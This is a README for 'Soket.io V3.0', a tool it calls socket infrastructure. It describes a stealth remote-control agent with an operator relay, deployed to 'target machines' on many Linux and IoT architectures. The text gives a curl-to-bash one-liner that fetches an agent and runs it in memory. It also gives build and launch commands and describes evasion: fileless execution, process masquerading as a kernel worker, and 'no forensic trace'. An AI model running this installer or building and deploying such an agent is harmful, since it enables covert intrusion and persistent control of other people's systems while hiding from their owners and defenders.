# SOKET.IO V3.0 | Unified Socket Infrastructure

[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Security](https://img.shields.io/badge/Security-BearSSL-cyan.svg)](https://bearssl.org/)
[![Arch](https://img.shields.io/badge/Arch-Multi--Arch-green.svg)](#supported-architectures)
[![Status](https://img.shields.io/badge/Status-Stable-red.svg)](#deployment)

Soket.io is a high-performance, lightweight, and stealthy socket infrastructure designed for secure communication and resilient infrastructure management. It provides a robust, encrypted communication layer with minimal system footprint and advanced evasion capabilities.

---

## Technical Specifications

| Feature | Details |
| :--- | :--- |
| **Encryption** | TLS 1.3 via BearSSL (Zero system dependencies) |
| **Binary Linkage** | Fully Static Musl-Libc (Stand-alone execution) |
| **Payload Size** | < 100KB (Optimized via UPX) |
| **Runtime** | Fileless execution via `memfd_create` (RAM-only) |
| **Network** | L7 Protocol Mimicry (HTTPS/TLS) |
| **Relay Backend** | High-concurrency Go implementation |

---

## Supported Architectures

Soket.io V3.0 is built to run on almost any Linux-based environment, from cloud servers to embedded devices.

- **x86_64**: Modern 64-bit server environments.
- **i386**: Legacy 32-bit systems.
- **AArch64**: 64-bit ARM (Cloud instances, Raspberry Pi 4+).
- **ARMv7/v6**: Embedded IoT devices and older hardware.

---

## Installation & Setup

### 1. Prerequisites
Ensure you have the following tools installed on your build machine:
- `gcc` (Cross-compilers for multi-arch)
- `musl-gcc` (For static linking)
- `go` 1.21+ (For the Relay server)
- `upx` (Optional, for binary compression)

### 2. Building the Client Agent
Navigate to the client directory and compile for your target architecture:

```bash
cd client
make clean
make x86_64   # Targets: x86_64, i386, aarch64, arm
```
The compiled binary will be located in `client/bin/phantom-client-prod`.

### 3. Building the Relay Server
The relay handles the communication between the operator and the agents.

```bash
cd relay
make build
./bin/phantom-relay -port 8443 -secret YOUR_SECRET_KEY
```

---

## Deployment

### Unified One-Liner (Production)
The fastest way to deploy the Soket.io agent is via the unified installer, which fetches and executes the agent directly in memory:

```bash
bash -c "$(curl -fsSL https://oyen-sec.github.io/soket/y)"
```

### Manual Deployment
1. Upload the `phantom-client-prod` binary to the target machine.
2. Execute with the required flags:
```bash
./phantom-client-prod -s YOUR_SECRET_KEY -i RELAY_IP_ADDRESS -p 8443
```

---

## Usage Guide

### Connecting to the Relay
Once your relay is running and agents are deployed, you can interact with them through the Relay Console.

1. **List Active Agents**:
   Access the relay logs or use the management tool to see connected UUIDs.
2. **Execute Commands**:
   Commands are sent through the encrypted TLS tunnel. The agent executes them in a masqueraded process context.
3. **P2P Mode**:
   For environments with direct connectivity, use the signaling service to establish a direct P2P hole-punched connection.

### Operational Security (OpSec)
- **Process Masquerading**: The agent automatically wipes its process arguments to appear as a common system daemon (e.g., `[kworker/u:1]`).
- **Fileless Execution**: When deployed via the one-liner, no files are written to the disk, leaving no forensic trace in the filesystem.

---

&copy; 2026 Oyen-Sec Infrastructure. Built for Resilience.
